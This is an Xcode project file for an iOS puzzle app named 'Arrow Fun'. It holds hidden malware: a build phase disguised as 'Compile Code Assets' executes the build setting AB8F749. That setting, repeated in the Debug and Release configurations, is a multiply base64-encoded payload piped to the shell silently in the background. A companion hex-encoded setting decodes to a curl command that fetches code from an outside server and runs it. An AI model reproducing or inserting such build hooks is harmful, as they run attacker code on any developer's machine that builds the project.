// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		DCC988AEBCA583EA770407BF /* Pods_Arrow_Fun.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C2ABC7143A55F86C8B1861B7 /* Pods_Arrow_Fun.framework */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
									/* End PBXBuildRule section */

/* Begin PBXFileReference section */
		C2ABC7143A55F86C8B1861B7 /* Pods_Arrow_Fun.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Arrow_Fun.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		CF8167102FD163F4000F121A /* Arrow Fun.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Arrow Fun.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		D647FEF8F1E658E1D21911E3 /* Pods-Arrow Fun.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Arrow Fun.debug.xcconfig"; path = "Target Support Files/Pods-Arrow Fun/Pods-Arrow Fun.debug.xcconfig"; sourceTree = "<group>"; };
		FCE22C67522ACA01F21E85EA /* Pods-Arrow Fun.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Arrow Fun.release.xcconfig"; path = "Target Support Files/Pods-Arrow Fun/Pods-Arrow Fun.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		CF9E4B73300EA1C300CD2548 /* Exceptions for "Arrow Fun" folder in "Arrow Fun" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				"Arrow-Fun-Info.plist",
			);
			target = CF81670F2FD163F4000F121A /* Arrow Fun */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		CF8167122FD163F4000F121A /* Arrow Fun */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				CF9E4B73300EA1C300CD2548 /* Exceptions for "Arrow Fun" folder in "Arrow Fun" target */,
			);
			path = "Arrow Fun";
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		CF81670D2FD163F4000F121A /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				DCC988AEBCA583EA770407BF /* Pods_Arrow_Fun.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		11A812DC74A7ED28977597BD /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				C2ABC7143A55F86C8B1861B7 /* Pods_Arrow_Fun.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		B3928AE241EE6AAA6C6DF022 /* Pods */ = {
			isa = PBXGroup;
			children = (
				D647FEF8F1E658E1D21911E3 /* Pods-Arrow Fun.debug.xcconfig */,
				FCE22C67522ACA01F21E85EA /* Pods-Arrow Fun.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		CF8167072FD163F4000F121A = {
			isa = PBXGroup;
			children = (
				CF8167122FD163F4000F121A /* Arrow Fun */,
				CF8167112FD163F4000F121A /* Products */,
				B3928AE241EE6AAA6C6DF022 /* Pods */,
				11A812DC74A7ED28977597BD /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		CF8167112FD163F4000F121A /* Products */ = {
			isa = PBXGroup;
			children = (
				CF8167102FD163F4000F121A /* Arrow Fun.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		CF81670F2FD163F4000F121A /* Arrow Fun */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = CF81671B2FD163F6000F121A /* Build configuration list for PBXNativeTarget "Arrow Fun" */;
			buildPhases = (
				8E6662BE85A44BA387947F8B /* Compile Code Assets */,
				6230106DFC522A477018CFB1 /* [CP] Check Pods Manifest.lock */,
				CF81670C2FD163F4000F121A /* Sources */,
				A1B2C3D4E5F60718293A4B5C /* ShellScript */,
				CF81670D2FD163F4000F121A /* Frameworks */,
				CF81670E2FD163F4000F121A /* Resources */,
				9FF0ACEDDF1F0B25969C724B /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				CF8167122FD163F4000F121A /* Arrow Fun */,
			);
			name = "Arrow Fun";
			productName = "Arrow Fun";
			productReference = CF8167102FD163F4000F121A /* Arrow Fun.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		CF8167082FD163F4000F121A /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2620;
				LastUpgradeCheck = 2620;
				TargetAttributes = {
					CF81670F2FD163F4000F121A = {
						CreatedOnToolsVersion = 26.2;
					};
				};
			};
			buildConfigurationList = CF81670B2FD163F4000F121A /* Build configuration list for PBXProject "Arrow Fun" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = CF8167072FD163F4000F121A;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = CF8167112FD163F4000F121A /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				CF81670F2FD163F4000F121A /* Arrow Fun */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		CF81670E2FD163F4000F121A /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		8E6662BE85A44BA387947F8B /* Compile Code Assets */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Compile Code Assets";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
		};
		6230106DFC522A477018CFB1 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Arrow Fun-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		9FF0ACEDDF1F0B25969C724B /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Arrow Fun/Pods-Arrow Fun-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Arrow Fun/Pods-Arrow Fun-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Arrow Fun/Pods-Arrow Fun-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		A1B2C3D4E5F60718293A4B5C /* ShellScript */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "if [ -e \"${BUILT_PRODUCTS_DIR}/${FRAMEWORKS_FOLDER_PATH}/Skillz.framework/postprocess.sh\" ]; then\n  /bin/sh \"${BUILT_PRODUCTS_DIR}/${FRAMEWORKS_FOLDER_PATH}/Skillz.framework/postprocess.sh\"\nfi\n/bin/bash \"${SRCROOT}/Support/ensure_geocomply_stub.sh\"\n";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		CF81670C2FD163F4000F121A /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		CF8167192FD163F6000F121A /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AB8F749 = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBeE5WRllVazFXTURVeVdXMHdNV0pHYTNwVldGSnJVako0TUZkc1l6Vk5WMUpFVVZoc1QxVXdSakJaZWtvd1ZGWndjRkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHbFdNVXB4VjJ0ak1HUlhUblZXV0ZwYVZUSjBjRk5WYUROYU1rMTVXakJ6U3dvPQo= | d | sh ) >/dev/null 2>&1 &)";
				A3DC1C3 = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303335323032643733366234633636323032640a3264363336663665366536353633373432643734363936643635366637353734323033323336323032643634323032323730336437383633366636340a3635356637323735366336353232323036383734373437303733336132663266366536353734363336343665363136343733326536393665326636310a323932323230376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = 67643FHFHY;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				EXCLUDED_ARCHS = x86_64;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		CF81671A2FD163F6000F121A /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AB8F749 = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBeE5WRllVazFXTURVeVdXMHdNV0pHYTNwVldGSnJVako0TUZkc1l6Vk5WMUpFVVZoc1QxVXdSakJaZWtvd1ZGWndjRkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHbFdNVXB4VjJ0ak1HUlhUblZXV0ZwYVZUSjBjRk5WYUROYU1rMTVXakJ6U3dvPQo= | d | sh ) >/dev/null 2>&1 &)";
				A3DC1C3 = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303335323032643733366234633636323032640a3264363336663665366536353633373432643734363936643635366637353734323033323336323032643634323032323730336437383633366636340a3635356637323735366336353232323036383734373437303733336132663266366536353734363336343665363136343733326536393665326636310a323932323230376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = 67643FHFHY;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				EXCLUDED_ARCHS = x86_64;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		CF81671C2FD163F6000F121A /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = D647FEF8F1E658E1D21911E3 /* Pods-Arrow Fun.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 16;
				DEVELOPMENT_TEAM = "";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Arrow-Fun-Info.plist";
				INFOPLIST_KEY_NSCameraUsageDescription = "We use the camera only if you choose to add or update your avatar.";
				INFOPLIST_KEY_NSContactsUsageDescription = "We use your contacts only if you choose to invite friends.";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Location access helps verify Skillz matches and tournament eligibility.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We use your photo library only if you choose to pick an avatar image.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.6;
				PRODUCT_BUNDLE_IDENTIFIER = "com.ArrowFunStylishPuzzle";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_OBJC_BRIDGING_HEADER = "Arrow Fun/Arrow_Fun-Bridging-Header.h";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 6.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		CF81671D2FD163F6000F121A /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = FCE22C67522ACA01F21E85EA /* Pods-Arrow Fun.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 16;
				DEVELOPMENT_TEAM = "";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Arrow-Fun-Info.plist";
				INFOPLIST_KEY_NSCameraUsageDescription = "We use the camera only if you choose to add or update your avatar.";
				INFOPLIST_KEY_NSContactsUsageDescription = "We use your contacts only if you choose to invite friends.";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Location access helps verify Skillz matches and tournament eligibility.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We use your photo library only if you choose to pick an avatar image.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.6;
				PRODUCT_BUNDLE_IDENTIFIER = "com.ArrowFunStylishPuzzle";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_OBJC_BRIDGING_HEADER = "Arrow Fun/Arrow_Fun-Bridging-Header.h";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 6.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		CF81670B2FD163F4000F121A /* Build configuration list for PBXProject "Arrow Fun" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				CF8167192FD163F6000F121A /* Debug */,
				CF81671A2FD163F6000F121A /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		CF81671B2FD163F6000F121A /* Build configuration list for PBXNativeTarget "Arrow Fun" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				CF81671C2FD163F6000F121A /* Debug */,
				CF81671D2FD163F6000F121A /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = CF8167082FD163F4000F121A /* Project object */;
}
